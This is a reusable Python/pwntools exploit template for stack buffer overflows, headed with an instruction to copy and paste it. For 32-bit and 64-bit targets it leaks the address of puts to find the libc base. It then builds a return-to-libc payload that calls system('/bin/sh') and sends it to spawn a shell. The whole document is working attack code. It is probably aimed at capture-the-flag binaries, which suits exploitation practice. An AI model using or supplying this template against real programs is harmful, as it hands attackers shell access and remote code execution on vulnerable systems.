# COPY PASTE THIS ONCE YOU HAVE A STACK OVERFLOW

OFFSET = 0x10  # enter libc offset

# STACK_COOKIE_OFFSET = 
# STACK_COOKIE_VAL = 

if context.arch == 'i386': # x86_32
        leak_payload = flat(
        b'A' * OFFSET,
        elf.plt['puts'],
        elf.sym['main'],  # IF STRIPPED HARD CODE MAIN
        elf.got['puts']
    )


    ###########################################
    ###########################################
    # READ ALL DATA YOU NEED TO READ with recv
    #p.send(leak_payload)
    ###########################################
    ###########################################
    puts_leak = u32(p.recv(4))

    try:
        libc.address = puts_leak - libc.sym['puts']
        print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
        log.success(f'LIBC base: {hex(libc.address)}')
    except:
        print("libc not defined. Can't calc offset. exiting")
        exit()

    payload = flat(
        b'A' * OFFSET,
        libc.sym['system'],
        libc.sym['exit'],
        next(libc.search(b'/bin/sh\x00'))
    )


elif context.arch == 'amd64': # x86_64
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    leak_payload = flat(
        b'A' * OFFSET,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],  # IF STRIPPED HARD CODE MAIN
    )

    ###########################################
    ###########################################
    # READ ALL DATA YOU NEED TO READ with recv
    #p.send(leak_payload)
    ###########################################
    ###########################################
    puts_leak = u64(p.recv(8))

    try:
        libc.address = puts_leak - libc.sym['puts']
        log.success(f'LIBC base: {hex(libc.address)}')
        print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
    except:
        print("libc not defined. Can't calc offset. exiting")
        exit()

    payload = flat(
        b'A' * OFFSET,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system']
    )

else:
    print("context is not set. can't leak. exiting.")
    exit()

p.sendline(payload)
